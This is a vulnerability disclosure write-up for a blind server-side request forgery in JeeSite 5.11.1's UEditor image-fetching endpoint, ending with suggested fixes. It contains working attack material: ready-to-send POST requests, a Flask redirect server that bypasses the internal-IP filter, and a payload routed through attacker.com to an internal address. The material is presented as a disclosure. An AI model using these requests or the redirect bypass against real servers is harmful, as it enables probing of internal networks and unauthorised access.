# jeesite_ssrf
# 0x01 Vulnerability Overview

A Server-Side Request Forgery (SSRF) vulnerability exists in JeeSite version 5.11.1, specifically in its integration of Baidu's UEditor component. The endpoint /js/a/file/ueditor/catchimage allows authenticated users to supply arbitrary external or internal URLs via the source[] parameter, which are then fetched by the server using Java's HttpURLConnection.

Internal IP access filtering is implemented but can be bypassed using a redirect through an attacker-controlled server. The backend only saves resources with an allowed MIME type such as image/jpeg. Since the response body is not returned to the attacker, this is a blind SSRF.

![image](https://github.com/user-attachments/assets/393312f5-fd45-435a-b5a3-5b626f46ed9c)

# 0x02 Environment and Setup

Tested project:

GitHub: https://github.com/thinkgem/jeesite5

Version: 5.11.1

Local environment:

JDK 17+

Maven 3.8+

MySQL 5.7 or embedded H2 DB

Executed via: /web/bin/run-tomcat.bat

Initial login:

URL: http://127.0.0.1:8980/js

Default accounts:

Admin: system / admin

Normal user: user1 / 123456

Authentication is required. All SSRF attempts must include a valid session cookie such as:

Cookie: jeesite.session.id=87a7cbddd3c449a6bfb96c1627baa9e9

![image](https://github.com/user-attachments/assets/8e4020f2-3417-47ee-81d1-857a7eb0d548)


# 0x03 Vulnerability Details

Vulnerable Endpoint:

POST /js/a/file/ueditor/catchimage
Host: 127.0.0.1:8980
Content-Type: application/x-www-form-urlencoded
Cookie: jeesite.session.id=4f805314119f46fcb2a372884987b3da

source[]=http://internal-ip:port/file.jpg

The following Java classes contain the vulnerable logic:

ImageHunter.java
ActionEnter.java

Call chain summary:
ActionEnter.exec() parses the action value.
If action = catchimage, it invokes ImageHunter.capture().
The source[] parameter is obtained via config field catcherFieldName.
ImageHunter.capture() iterates the list and calls captureRemoteData().

Inside captureRemoteData(), it uses:
connection = (HttpURLConnection) url.openConnection();
suffix = MIMEType.getSuffix(connection.getContentType());

Only content with image-type MIME headers will be written to disk.

![image](https://github.com/user-attachments/assets/d90828cc-71c2-4ea6-b55f-1b61cd151e8c)
![image](https://github.com/user-attachments/assets/7ee41efe-89ae-4301-a3a4-979db539cd30)
![image](https://github.com/user-attachments/assets/c2bc7eb8-aa37-4cb1-bf4e-2bee3a67f799)
![image](https://github.com/user-attachments/assets/044d646f-1887-49b6-9c01-1dd9602b370d)
![image](https://github.com/user-attachments/assets/cfc5c88a-ffdb-46d3-ac59-00f3843691fb)
![image](https://github.com/user-attachments/assets/dfe4a3d3-f126-4e27-a211-c6869f4dec63)


# 0x04 Redirect-based IP Bypass

Although internal IP access is blocked by host validation logic:

if (!validHost(url.getHost())) {
    return new BaseState(false, AppInfo.PREVENT_HOST);
}

...this can be bypassed using a redirect. JeeSite will follow 302 redirections, but the final Content-Type is still validated.

Example attacker-controlled Flask redirect server:

from flask import Flask, request, redirect
app = Flask(__name__)

@app.route("/ssrf")
def go():
    url = request.args.get("url")
    return redirect(url, code=302)

app.run(host="0.0.0.0", port=8000)

Log in to JeeSite with any user (e.g., user1 / 123456).
Craft a POST request:

POST /js/a/file/ueditor/catchimage
Host: target.com
Content-Type: application/x-www-form-urlencoded
Cookie: jeesite.session.id=87a7cbddd3c449a6bfb96c1627baa9e9

source[]=http://attacker.com:8000/ssrf?url=http://192.168.1.17:80/test.jpg

If the image exists and responds with the correct content-type, JeeSite will store the file.

Access it via:

http://target.com/userfiles/ueditor/image/yyyy/mm/dd/xxx.jpg

![image](https://github.com/user-attachments/assets/a6eeb768-ae1b-4381-b084-74774a0f65ea)
![image](https://github.com/user-attachments/assets/5be1e6d0-09a7-4fe6-b749-b8c540bc0e24)


# 0x05 Limitations

The SSRF is blind; no response body is returned to the user.

Only URLs that respond with Content-Type: image/jpeg or similar will be saved.

Requests to services like AWS metadata (http://169.254.169.254/) are ineffective unless they respond with allowed image MIME types.

# 0x06 Impact

Internal port scanning and basic service detection

Indirect file access via image content trick

Can serve as a foothold in chained internal attacks (e.g., uploading image-encoded secrets)

# 0x07 Suggested Fixes

Perform strict IP address validation after following redirects

Maintain a denylist for localhost, private IP ranges, and metadata IPs

Restrict access to UEditor image fetching endpoint or disable it if unused

